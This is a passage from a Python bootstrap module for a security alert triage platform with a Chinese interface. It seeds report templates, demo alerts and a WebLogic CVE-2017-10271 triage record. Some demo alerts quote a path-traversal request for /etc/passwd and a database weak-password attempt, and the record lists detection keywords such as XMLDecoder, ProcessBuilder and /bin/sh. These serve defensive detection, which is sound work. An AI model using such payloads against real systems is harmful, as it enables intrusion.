                "【安全运营日报 - {{当前日期}}】\n\n"
                "一、 运行概况\n"
                "今日共监测到告警 {{当前总数}} 条，其中高危/极高告警占比 {{高危告警占比}}。\n"
                "当前已完成处置 {{已办结数}} 条，整体处置率为 {{当前处置率}}。\n"
                "平均处置耗时：{{平均处置耗时}}。\n\n"
                "二、 风险分布\n"
                "【活跃攻击源 Top 5】\n{{Top5_攻击源排行}}\n\n"
                "【受攻击资产 Top 5】\n{{Top5_受攻击资产排行}}\n\n"
                "资产信息命中率：{{资产命中率}}\n\n"
                "三、 待办提示\n"
                "目前仍有 {{待处理数}} 条告警处于待处理状态，请各位研判员及时关注。"
            ),
            "variables": ["当前日期", "当前总数", "高危告警占比", "已办结数", "当前处置率", "平均处置耗时", "Top5_攻击源排行", "Top5_受攻击资产排行", "资产命中率", "待处理数"],
            "scope": "team",
            "is_default": False,
        },
    )
    _ensure_template(
        db,
        workspace.id,
        {
            "device_id": None,
            "name": "演示模板-CSV资产导出",
            "type": "csv",
            "content": (
                "告警ID：{{告警ID}}\n"
                "告警Hash：{{告警Hash}}\n"
                "事件类型：{{演示规则-态势感知事件类型}}\n"
                "源IP：{{演示规则-态势感知源IP}}\n"
                "源资产：{{源资产名称}}\n"
                "目的IP：{{演示规则-态势感知目的IP}}\n"
                "目的资产：{{目的资产名称}}\n"
                "目的重要性：{{目的资产重要性}}\n"
                "状态：{{状态}}\n"
                "AI研判：{{AI 研判结果}}"
            ),
            "variables": ["告警ID", "告警Hash", "演示规则-态势感知事件类型", "演示规则-态势感知源IP", "源资产名称", "演示规则-态势感知目的IP", "目的资产名称", "目的资产重要性", "状态", "AI 研判结果"],
            "scope": "team",
            "is_default": False,
        },
    )

    demo_alerts = [
        {
            "event_type": "HTTP目录遍历请求尝试",
            "raw_text": (
                "告警时间: 2026-05-24 09:30:00\n"
                "源IP: 172.21.112.184\n源端口: 54321\n目的IP: 172.16.1.80\n目的端口: 80\n协议: HTTP\n"
                "事件类型: HTTP目录遍历请求尝试\n风险等级: high\n请求内容: GET /../../../../etc/passwd HTTP/1.1\n"
                "响应内容: HTTP/1.1 403 Forbidden\n攻击载荷: /../../../../etc/passwd"
            ),
            "src": portal,
            "dst": api_asset,
            "project": project,
            "device": waf,
            "status": STATUS_ANALYSIS,
            "current_group": GROUP_ANALYSIS,
            "assignee": None,
            "created_by": monitor,
            "severity": "high",
            "tags": ["演示", "资产命中", "WAF"],
            "ai_result": "演示研判：源资产为外部门户，目的资产为高重要性生产 API。建议确认请求是否来自合法扫描，若非授权应封禁源 IP 并排查目的资产访问日志。",
        },
        {
            "event_type": "数据库异常登录尝试",
            "raw_text": (
                "告警时间: 2026-05-24 11:20:00\n"
                "源IP: 192.168.66.23\n源端口: 50888\n目的IP: 10.20.30.40\n目的端口: 5432\n协议: TCP\n"
                "事件类型: 数据库异常登录尝试\n攻击阶段: 横向移动\n请求内容: login user=postgres db=trade\n"
                "响应内容: password authentication failed\n攻击载荷: postgres weak password attempt"
            ),
            "src": office_asset,
            "dst": db_asset,
            "project": ops_project,
            "device": ndr,
            "status": STATUS_ANALYSIS,
            "current_group": GROUP_ANALYSIS,
            "assignee": analyst,
            "created_by": monitor,
            "severity": "medium",
            "tags": ["演示", "NDR", "横向移动"],
            "ai_result": "演示研判：办公区访问核心数据区数据库失败，目的资产为 critical 数据库节点。建议排查源终端是否异常，并限制办公区到数据区直连。",
        },
        {
            "event_type": "WebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）",
            "raw_text": situational_awareness_sample,
            "src": None,
            "src_ip": "198.51.100.22",
            "dst": weblogic_asset,
            "project": project,
            "device": situational_awareness,
            "status": STATUS_DISPOSAL,
            "current_group": GROUP_DISPOSAL,
            "assignee": None,
            "created_by": monitor,
            "analysis_owner": analyst,
            "disposal_target": "src_ip",
            "disposal_action": "block",
            "disposal_ip": "198.51.100.22",
            "severity": "medium",
            "tags": ["演示", "态势感知", "WebLogic", "CVE-2017-10271"],
            "ai_result": "演示研判：态势感知平台检测到 WebLogic WLS CVE-2017-10271 远程命令执行企图，目的资产为高重要性 DMZ WebLogic 服务器。建议确认是否暴露 wls-wsat 组件，核查 9002 端口访问日志，临时阻断攻击源并推进 WebLogic 补丁或组件下线。",
        },
    ]

    for item in demo_alerts:
        exists = db.query(Alert).filter_by(workspace_id=workspace.id, event_type=item["event_type"], raw_text=item["raw_text"]).first()
        if exists:
            continue
        src_ctx = _asset_context(item["src"])
        dst_ctx = _asset_context(item["dst"])
        parsed_fields = {
            "event_type": item["event_type"],
            "src_ip": item.get("src_ip") or src_ctx.get("ip", "192.168.66.23"),
            "dst_ip": item.get("dst_ip") or dst_ctx.get("ip", ""),
            "src_asset_context": src_ctx,
            "dst_asset_context": dst_ctx,
            "asset_context": {"src_asset": src_ctx, "dst_asset": dst_ctx},
            "src_asset_name": src_ctx.get("name", ""),
            "src_asset_area": src_ctx.get("area", ""),
            "src_asset_owner": src_ctx.get("owner", ""),
            "dst_asset_name": dst_ctx.get("name", ""),
            "dst_asset_area": dst_ctx.get("area", ""),
            "dst_asset_owner": dst_ctx.get("owner", ""),
            "dst_asset_criticality": dst_ctx.get("criticality", ""),
            "demo_marker": "演示数据",
        }
        db.add(
            Alert(
                workspace_id=workspace.id,
                project_id=item["project"].id,
                device_id=item["device"].id,
                raw_text=item["raw_text"],
                parsed_fields=parsed_fields,
                src_asset_context=src_ctx,
                dst_asset_context=dst_ctx,
                alert_hash="",
                source_ip=parsed_fields["src_ip"],
                destination_ip=parsed_fields["dst_ip"],
                event_type=item["event_type"],
                severity=item["severity"],
                status=item["status"],
                current_group=item.get("current_group") or GROUP_ANALYSIS,
                assignee_id=item.get("assignee").id if item.get("assignee") else None,
                claimed_at=datetime.utcnow() if item.get("assignee") else None,
                analysis_owner_id=(item.get("analysis_owner") or item.get("assignee")).id if (item.get("analysis_owner") or item.get("assignee")) else None,
                disposal_owner_id=item.get("assignee").id if item.get("current_group") == GROUP_DISPOSAL and item.get("assignee") else None,
                disposal_target=item.get("disposal_target", ""),
                disposal_action=item.get("disposal_action", ""),
                disposal_ip=item.get("disposal_ip", ""),
                tags=item["tags"],
                comments=[{"author": "system", "content": "初始化演示数据，用于快速验证功能。"}],
                ai_result=item["ai_result"],
                ti_result={"sources": ["demo"], "src_ip_ti": None, "dst_ip_ti": None},
                created_by_id=(item.get("created_by") or admin).id,
                last_updated_by_id=admin.id,
            )
        )

    demo_experience = db.query(AiExperience).filter_by(workspace_id=workspace.id, knowledge_id="KNOW-STE-DEMO-0001").first()
    if not demo_experience:
        weblogic_alert = db.query(Alert).filter_by(
            workspace_id=workspace.id,
            event_type="WebLogic WLS 组件远程命令执行漏洞（CVE-2017-10271）",
        ).first()
        db.add(
            AiExperience(
                workspace_id=workspace.id,
                knowledge_id="KNOW-STE-DEMO-0001",
                source_alert_id=weblogic_alert.id if weblogic_alert else None,
                alert_hash=weblogic_alert.alert_hash if weblogic_alert else "",
                title="WebLogic WLS CVE-2017-10271 企图阶段研判经验",
                tags=["WebLogic", "CVE-2017-10271", "企图", "态势感知"],
                index_data={
                    "rule_id": ["24174"],
                    "cve": ["CVE-2017-10271"],
                    "event_type_keywords": ["WebLogic", "远程命令执行", "WLS"],
                    "request_paths": ["/wls-wsat/CoordinatorPortType"],
                    "payload_keywords": ["XMLDecoder", "ProcessBuilder", "/bin/sh", "wls-wsat"],
                    "response_codes": ["404", "403", "400"],
                    "asset_tags": ["WebLogic", "外网暴露"],
                    "asset_area": "DMZ区",
                    "attack_result": "企图",
                    "terminal_status": "disposed",
                },
                ste={
                    "S": "基于服务真实性、组件路径和响应结果的 WebLogic RCE 告警研判策略。",
                    "T": {
                        "steps": [
                            "核验目标资产是否真实运行 WebLogic 或暴露 wls-wsat 组件。",
                            "检查请求路径与响应结果，若返回 404/403/400，应优先判断攻击是否未命中有效组件。",
                            "结合资产标签、开放端口和处置结果确认是否需要继续升级处置。",
                        ],
                        "conclusion": "当命中 CVE-2017-10271 规则但目标组件路径不存在或响应异常时，攻击通常停留在企图阶段，可作为降噪研判依据。",
                    },
                    "E": {
                        "alarm": {"event": "WebLogic WLS RCE", "rule_id": "24174", "res": "企图"},
                        "proof": {"req": "POST /wls-wsat/CoordinatorPortType", "keywords": ["XMLDecoder", "ProcessBuilder", "/bin/sh"]},
                    },
                },
                action={
                    "asset": "复核目标资产 WebLogic 标签、9002 端口和 wls-wsat 组件暴露情况。",
                    "soar": "IF rule_id=='24174' AND response_code IN ['404','403','400'] THEN suggest_mark('扫描未遂/结构性误报') AND drop_level('low')",
                },
                quality={"confidence": "medium", "risk": "演示经验，真实环境需结合响应码和访问日志确认。", "review_notes": "初始化演示数据。"},
                status="published",
                created_by_id=admin.id,
                updated_by_id=admin.id,
            )
        )


def _ensure_message_columns(db: Session) -> None:
    dialect = db.bind.dialect.name if db.bind else "sqlite"
    
    # 消息表列定义
    message_cols = [
        ("actor_id", "INTEGER"),
        ("alert_id", "INTEGER"),
        ("alert_hash", "VARCHAR(64) DEFAULT '' NOT NULL"),
        ("message_type", "VARCHAR(60) DEFAULT 'workflow' NOT NULL"),
        ("read_at", "DATETIME" if dialect == "sqlite" else "TIMESTAMP"),
        ("payload", "JSON DEFAULT '{}' NOT NULL" if dialect == "sqlite" else "JSON DEFAULT '{}'::json NOT NULL"),
        ("created_at", "DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL" if dialect == "sqlite" else "TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL"),
        ("updated_at", "DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL" if dialect == "sqlite" else "TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL"),
    ]

    if dialect == "sqlite":
        rows = db.execute(text("PRAGMA table_info(messages)")).fetchall()
        table_columns = {row[1] for row in rows}
        if not table_columns: return # 表不存在，让 create_all 处理
        
        for col, col_type in message_cols:
            if col not in table_columns:
                db.execute(text(f"ALTER TABLE messages ADD COLUMN {col} {col_type}"))
    else:
        # PostgreSQL
        for col, col_type in message_cols:
            check_sql = text(f"""
                SELECT count(*) FROM information_schema.columns 
                WHERE table_name='messages' AND column_name='{col}'
            """)
            count = db.execute(check_sql).scalar()
            if count == 0:
                try:
                    db.execute(text(f"ALTER TABLE messages ADD COLUMN {col} {col_type}"))
                except Exception:
                    pass


def bootstrap_defaults(db: Session) -> None:
    _ensure_alert_columns(db)
    _ensure_message_columns(db)
    _ensure_asset_constraints(db)
    settings = get_settings()
    workspace = db.query(Workspace).filter_by(name="Default Workspace").first()
    if not workspace:
        workspace = Workspace(name="Default Workspace")
        db.add(workspace)
        db.flush()

    bootstrap_meta_rules(db, workspace.id)
    _ensure_ai_defaults(db, workspace.id)

    user = db.query(User).filter_by(username=settings.initial_admin_username).first()
    if not user:
        user = User(
            workspace_id=workspace.id,
            username=settings.initial_admin_username,
            display_name="Administrator",
            password_hash=hash_password(settings.initial_admin_password),
            role="admin",
        )
        db.add(user)
        db.flush()

    project = db.query(Project).filter_by(workspace_id=workspace.id, name="默认项目").first()
    if not project:
        db.add(Project(workspace_id=workspace.id, name="默认项目", description="默认告警协作项目"))

    device = db.query(Device).filter_by(workspace_id=workspace.id, name="通用安全设备").first()
    if not device:
        db.add(Device(workspace_id=workspace.id, name="通用安全设备", vendor="Generic", product="Security Device"))

    template = db.query(Template).filter_by(workspace_id=workspace.id, type="message", is_default=True).first()
    if not template:
        db.add(
            Template(
                workspace_id=workspace.id,
                name="默认告警消息模板",
                type="message",
                is_default=True,
                variables=[
                    "事件名称", "告警时间", "源IP", "源端口", 
                    "目的IP", "目的端口", "协议", "请求内容", 
                    "响应内容", "攻击载荷"
                ],
                content=(
                    "事件名称: {{事件名称}}\n"
                    "告警时间: {{告警时间}}\n"
                    "源IP: {{源IP}}\n"
                    "源端口: {{源端口}}\n"
                    "目的IP: {{目的IP}}\n"
                    "目的端口: {{目的端口}}\n"
                    "协议: {{协议}}\n"
                    "请求内容: {{请求内容}}\n"
                    "响应内容: {{响应内容}}\n"
                    "攻击载荷: {{攻击载荷}}"
                ),
            )
        )

    _backfill_alert_dedup_hashes(db)
    _backfill_alert_workflow_fields(db)
    _ensure_demo_data(db, workspace, user)
    _backfill_alert_dedup_hashes(db)
    _backfill_alert_workflow_fields(db)

    db.commit()
